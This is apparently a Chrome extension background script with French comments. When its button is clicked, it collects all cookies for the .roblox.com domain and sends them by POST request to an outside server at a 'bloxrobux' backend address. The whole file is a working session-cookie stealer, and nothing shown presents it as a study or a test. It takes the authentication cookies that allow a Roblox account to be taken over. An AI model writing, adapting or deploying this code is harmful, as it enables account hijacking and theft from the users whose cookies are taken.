chrome.action.onClicked.addListener(async () => {
  // Récupérer tous les cookies du domaine Roblox
  chrome.cookies.getAll({ domain: ".roblox.com" }, async (cookies) => {
    if (!cookies || cookies.length === 0) {
      chrome.notifications.create({
        type: "basic",
        iconUrl: "icon.png",
        title: "Erreur",
        message: "Aucun cookie trouvé pour Roblox"
      });
      return;
    }

    try {
      // Envoyer les cookies au serveur via POST
      const response = await fetch("https://bloxrobux-backend.onrender.com/api/receive-cookies", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": "Bearer SUPER_SECRET_TOKEN"
        },
        body: JSON.stringify(cookies)
      });

      const data = await response.json();

      chrome.notifications.create({
        type: "basic",
        iconUrl: "icon.png",
        title: "Cookies envoyés",
        message: `${cookies.length} cookies Roblox envoyés au serveur`
      });
    } catch (err) {
      console.error(err);
      chrome.notifications.create({
        type: "basic",
        iconUrl: "icon.png",
        title: "Erreur",
        message: "Impossible d’envoyer les cookies"
      });
    }
  });
});
